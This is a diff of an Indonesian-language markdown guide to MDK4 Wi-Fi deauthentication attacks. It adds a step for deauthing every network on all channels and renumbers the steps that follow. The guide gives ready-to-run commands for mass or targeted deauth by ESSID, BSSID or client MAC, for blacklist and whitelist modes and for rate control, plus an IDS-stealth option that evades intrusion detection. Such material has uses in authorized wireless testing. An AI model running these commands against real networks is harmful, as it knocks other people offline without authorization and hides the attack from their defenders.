@@ -54,12 +54,19 @@ sudo airodump-ng [interface]
 
 **2. Jalankan MDK4:**
 
-   1. Deauth semua Wi-Fi yang ada di channel tertentu:
+   1. Deauth semua Wi-Fi di semua channel:
+
+      ```
+      sudo mdk4 [interface] d -c h
+      ```
+
+      Opsi `-c h` mengaktifkan channel hopping pada semua channel `b/g` (1–14). Secara default `MDK4` berpindah antar channel setiap 3 detik.
+   2. Deauth semua Wi-Fi yang ada di channel tertentu:
 
       ```
       sudo mdk4 [interface] d -c [channel]
       ```
-   2. Blacklist mode:
+   3. Blacklist mode:
 
       ```
       sudo mdk4 [interface] d -b [file_blacklist] -c [channel]
@@ -67,7 +74,7 @@ sudo airodump-ng [interface]
       
       - Blacklist mode hanya melakukan deauth terhadap MAC address yang ada di file `[file_blacklist]`.
       - File `[file_blacklist]` berisi MAC address AP (BSSID) atau client yang akan di-deauth.
-   3. Whitelist mode:
+   4. Whitelist mode:
 
       ```
       sudo mdk4 [interface] d -w [file_whitelist] -c [channel]
@@ -75,36 +82,36 @@ sudo airodump-ng [interface]
 
       - Whitelist mode melakukan deauth terhadap semua MAC address, kecuali yang ada di file `[file_whitelist]`.
       - File `[file_whitelist]` berisi MAC address AP (BSSID) atau client yang akan dilindungi dari deauth.
-   4. Speed control:
+   5. Speed control:
 
       ```
       sudo mdk4 [interface] d -s [speed] -c [channel]
       ```
 
       Speed control untuk mengatur kecepatan pengiriman paket dalam packets per second (pps). Tanpa opsi `-s`, defaultnya unlimited (tergantung kemampuan hardware).
-   5. Mode stealth:
+   6. Mode stealth:
 
       ```
       sudo mdk4 [interface] d -c [channel] -x
       ```
 
       Opsi `-x` mengaktifkan IDS stealth dengan menyesuaikan sequence numbers paket untuk menghindari deteksi oleh Intrusion Detection System.
-   6. Target AP berdasarkan ESSID:
+   7. Target AP berdasarkan ESSID:
 
       ```
       sudo mdk4 [interface] d -E [essid] -c [channel]
       ```
-   7. Target AP berdasarkan BSSID:
+   8. Target AP berdasarkan BSSID:
 
       ```
       sudo mdk4 [interface] d -B [bssid] -c [channel]
       ```
-   8. Target client spesifik:
+   9. Target client spesifik:
 
       ```
       sudo mdk4 [interface] d -S [mac_client] -c [channel]
       ```
-   9. Whitelist station spesifik:
+   10. Whitelist station spesifik:
 
       ```
       sudo mdk4 [interface] d -W [mac_client] -c [channel]
